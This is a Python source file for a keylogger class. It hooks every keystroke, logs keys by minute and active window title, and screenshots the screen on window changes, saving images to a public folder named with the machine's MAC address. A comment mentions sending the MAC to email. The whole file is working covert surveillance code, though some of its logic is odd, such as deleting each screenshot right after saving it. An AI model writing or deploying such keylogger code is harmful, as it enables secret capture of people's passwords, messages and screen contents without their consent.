import time
import keyboard
import os
import pygetwindow
from getmac import get_mac_address
from PIL import ImageGrab



class KeyloggerService:
    # send mac to email
    def __init__(self, if_screenshot=True):
        self.__if_screenshot = if_screenshot
        self.__action = False
        self.__data = {}
        self.__current_window = pygetwindow.getActiveWindowTitle()
        self.__prev_window = None




    @property
    def action(self):
        return self.__action

    @property
    def data(self):
        db = self.__data
        self.__data = {}
        return db

    def __update_current_window(self):
        self.__current_window = pygetwindow.getActiveWindowTitle()

    def _start(self) -> None:
        self.__change_action()
        while self.__action:
            try:
                keyboard.on_press(self.__on_press)
                keyboard.on_release(self.__add_on_release)
            except:
                self.__change_action()
            time.sleep(0.1)

    def __change_action(self):
        self.__action = not self.__action

    @staticmethod
    def __current_date() -> str:
        return time.strftime('%d/%m/%Y')

    @staticmethod
    def __current_time() -> str:
        return time.strftime('%H:%M')

    def __on_press(self, pressed_key):
        key = pressed_key.name
        self.__add_to_data(self.__data, key)


    def __add_on_release(self, pressed_key):
        return pressed_key.name

    def _take_shot(self):
        if self.__if_screenshot:
            self.__update_current_window()
            if self.__prev_window != self.__current_window:
                    print('take a shot')
                    snapshot = ImageGrab.grab()
                    # save_path = rf"C:\Users\User\Desktop\DATE={time.strftime('%d-%m-%Y')}TIME={time.strftime('%H-%M-%S')}.jpg"
                    save_path = rf"C:\Users\Public\MAC={get_mac_address().replace(':','-')}DATE={time.strftime('%d-%m-%Y')}TIME={time.strftime('%H-%M-%S')}.jpg"
                    snapshot.save(save_path)
                    os.remove(save_path)
                    self.__prev_window = self.__current_window


    def __add_to_data(self, dictionary: dict, data: str):
        self.__update_current_window()
        current_time = self.__current_time()
        if current_time not in dictionary:
            dictionary[current_time] = {}
        if self.__current_window not in dictionary[current_time]:
            dictionary[current_time][self.__current_window] = []
        dictionary[current_time][self.__current_window].append(data)


        # current_date = self.__current_date()
        # current_time = self.__current_time()
        # mac = get_mac_address()
        # if not dictionary.get(mac):
        #     dictionary[mac]={}
        # if not current_date in dictionary[mac]:
        #     dictionary[mac][current_date] = {}
        # if not current_time in dictionary[mac][current_date]:
        #     dictionary[mac][current_date][current_time] = {}
        # if not self.__current_window in dictionary[mac][current_date][current_time]:
        #     dictionary[mac][current_date][current_time][self.__current_window] = []
        # dictionary[mac][current_date][current_time][self.__current_window].append(data)


    def __enter__(self):
        self._start()

    def __exit__(self, exc_type, exc_val, exc_tb):
        return 1